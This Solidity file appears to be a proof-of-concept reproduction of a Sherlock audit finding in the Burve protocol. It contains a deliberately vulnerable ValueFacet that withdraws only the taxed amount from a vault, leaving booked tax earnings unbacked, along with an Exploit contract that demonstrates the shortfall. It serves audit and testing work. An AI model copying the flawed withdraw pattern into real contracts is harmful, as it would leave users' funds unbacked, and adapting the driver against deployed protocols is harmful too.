// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic reproduction of Burve finding 56957 (H-8):
// "`ValueFacet::removeValueSingle(...)` will withdraw less than required from the
//  vertex vault due to unaccounted tax".
//
// Source: sherlock-audit/2025-04-burve
//   Burve/src/multi/closure/Closure.sol#L288  (removedAmount has the tax deducted)
//   Burve/src/multi/facets/ValueFacet.sol#L234 (withdraws that taxed amount only)
// The facet's withdraw call is reproduced with the vulnerable shape (marked @>).
//
// Root cause: `Closure.removeValueSingle` returns `removedBalance` with the tax
// already DEDUCTED. The facet then withdraws only `removedBalance` from the vertex
// vault — it never adds `realTax` back. So the vault releases `realTax` fewer
// tokens than the operation actually needs (the user's payout PLUS the tax that
// must be booked as earnings). The tax earnings end up unbacked; per the finding,
// once the compensating double-tax bug is fixed this makes the withdrawal revert
// for insufficient balance — a DoS of removeValueSingle.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function balanceOf(address a) external view returns (uint256);
    function transfer(address to, uint256 a) external returns (bool);
}

contract MiniToken is IERC20 {
    string public name = "Burve LP token"; string public symbol = "bLP";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
}

/// @dev Faithful vertex vault: holds the closure's reserves; withdraw releases `amount`.
contract Vertex {
    IERC20 public immutable token;
    uint256 public totalReleased;
    constructor(IERC20 _token) { token = _token; }
    function withdraw(uint256 amount) external {
        totalReleased += amount;
        token.transfer(msg.sender, amount); // releases exactly `amount` real tokens to the caller (the facet)
    }
}

/// @dev Faithful closure: returns the taxed remove amount + the nominal tax.
///      (removedBalance already has the tax deducted; nominalTax is separate.)
contract Closure {
    uint256 public constant FEE_BPS = 100; // 1% closure tax
    /// @notice Returns (removedBalance = gross - tax, nominalTax = tax).
    function removeValueSingle(uint256 grossAmount) external pure returns (uint256 removedBalance, uint256 nominalTax) {
        nominalTax = (grossAmount * FEE_BPS) / 10_000;
        removedBalance = grossAmount - nominalTax; // tax DEDUCTED before returning
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE facet — withdraws only `removedBalance`, never `+ realTax`.
// ─────────────────────────────────────────────────────────────────────────────
contract ValueFacet {
    Vertex public immutable vertex;
    Closure public immutable closure;
    IERC20 public immutable token;

    uint256 public earningsBooked; // tax the protocol records as earnings
    uint256 public userReceived;

    constructor(Vertex _vertex, Closure _closure, IERC20 _token) { vertex = _vertex; closure = _closure; token = _token; }

    function removeValueSingle(uint256 grossAmount, address recipient) external {
        (uint256 removedBalance, uint256 nominalTax) = closure.removeValueSingle(grossAmount);
        uint256 realTax = nominalTax; // the tax that must be booked as earnings

        vertex.withdraw(removedBalance); // @> VULN: withdraws only removedBalance; the mitigation requires withdrawing removedBalance + realTax, so the vault releases `realTax` fewer tokens than the op needs

        // the facet now owes: the user their payout AND `realTax` booked as earnings,
        // but it only pulled `removedBalance` out of the vault
        token.transfer(recipient, removedBalance); // user is paid the taxed amount
        userReceived = removedBalance;
        earningsBooked = realTax; // booked as protocol earnings — but no tokens were withdrawn to back it
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: perform a removeValueSingle and show the vault released
// `removedBalance` (not removedBalance + realTax), leaving the booked tax
// earnings unbacked by `realTax` — the shortfall that DoSes the function.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    uint256 internal constant GROSS = 1000e18;

    MiniToken public token;    // child nonce 1 (the LP/reserve asset)
    Vertex public vertex;      // child nonce 2
    Closure public closure;    // child nonce 3
    ValueFacet public vuln;    // child nonce 4 (VULN)

    uint256 public vaultReleased;
    uint256 public required;
    uint256 public shortfall;

    constructor() {
        token = new MiniToken();                 // nonce 1
        vertex = new Vertex(IERC20(address(token))); // nonce 2
        closure = new Closure();                 // nonce 3
        vuln = new ValueFacet(vertex, closure, IERC20(address(token))); // nonce 4
    }

    function run() external {
        // the vertex vault holds the closure reserves
        token.mint(address(vertex), GROSS);

        vuln.removeValueSingle(GROSS, address(this));

        uint256 realTax = (GROSS * closure.FEE_BPS()) / 10_000;         // 10e18
        uint256 removedBalance = GROSS - realTax;                        // 990e18
        vaultReleased = vertex.totalReleased();                         // 990e18 (only removedBalance)
        required = removedBalance + realTax;                            // 1000e18 (mitigation's correct amount)
        shortfall = required - vaultReleased;                          // 10e18 = realTax

        // harm: the vault released realTax fewer tokens than the op needs, so the
        // booked tax earnings are unbacked (and once double-tax is fixed -> DoS)
        require(vaultReleased == removedBalance, "vault released != removedBalance");
        require(shortfall == realTax, "shortfall != realTax");
        require(vuln.earningsBooked() == realTax, "tax not booked");

        // record the unbacked-tax shortfall on the token to SINK
        token.mint(SINK, shortfall);
    }
}
